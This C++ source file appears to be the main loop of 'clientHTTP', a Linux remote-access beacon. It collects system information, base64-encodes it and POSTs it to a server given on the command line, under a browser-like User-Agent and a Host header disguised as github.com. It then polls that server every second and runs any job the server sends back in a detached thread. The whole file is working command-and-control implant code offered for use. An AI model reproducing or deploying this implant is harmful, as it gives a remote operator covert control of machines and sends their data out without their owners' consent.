// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


#include <iostream>
#include <string>
#include "http.h"
#include <sstream>
#include <unistd.h>
#include "utilities.h"
#include <vector>
#include <mutex>
#include <queue>
#include "operations.h"
#include <thread>


// These are all extern variables declared in "operations.h" file
std::queue<std::wstring> responseQueue;
std::mutex responseQueueMutex;
std::queue<std::wstring> jobQueue;
std::mutex jobQueueMutex;
std::wstring jsonSysInfo;


#define NUM_OF_ARGS 2


int main(int argc, char** argv) {

    if(argc != NUM_OF_ARGS){
        std::cout << "clientHTTP <URL/IP>" <<std::endl;
        return -1;
    }
    // Set the HEART BEAT TIMER (in secs)
    const long heartbeatTimerInSecs {1};

    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";
    std::wstring hostname{ s2ws(argv[1]) };
    //request += "Host: "+hostname+"\r\n";
    
    jsonSysInfo = getSysInfo();

    if(jsonSysInfo.empty()){
        std::cout << "Couldn't extract system information\n";
        //exit(-1);     // Inform CRC about the this status by sending log or json NULL bytes
    }
    
    std::string dataBase64 = base64_encode((unsigned char*)ws2s(jsonSysInfo).c_str(), jsonSysInfo.length());
    std::wstringstream contentLengthStream;
    contentLengthStream << dataBase64.length();
    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
    request += L"Connection: close\r\n"; 
    request += L"\r\n" + s2ws(dataBase64); 
    
    std::wstring replyFromServerInJson;
    std::wstring response;    
    const std::wstring heartbeatRequestToServer = request;

    while(true){
        if(!responseQueue.empty()){         // If there is a response to be send to the server
            responseQueueMutex.lock();
            request = responseQueue.front();
            responseQueue.pop();
            responseQueueMutex.unlock();
        }
        else {                             // else, send the standard http post message to the server
            request = heartbeatRequestToServer;
        }        
        replyFromServerInJson = httpPost(hostname, request);
        
        if(isJobAvailable(replyFromServerInJson)){  // Check the response from the server to see if it is a job request
            jobQueueMutex.lock();
            jobQueue.push(replyFromServerInJson);
            jobQueueMutex.unlock();
            std::thread jobThread(startJob);      // Spawn a thread if there is a job waiting in the queue
            jobThread.detach();
        }               
        request = heartbeatRequestToServer;        
        sleep(heartbeatTimerInSecs);                // for for microsecond intervals, use usleep() --> https://man7.org/linux/man-pages/man3/usleep.3.html
    }
}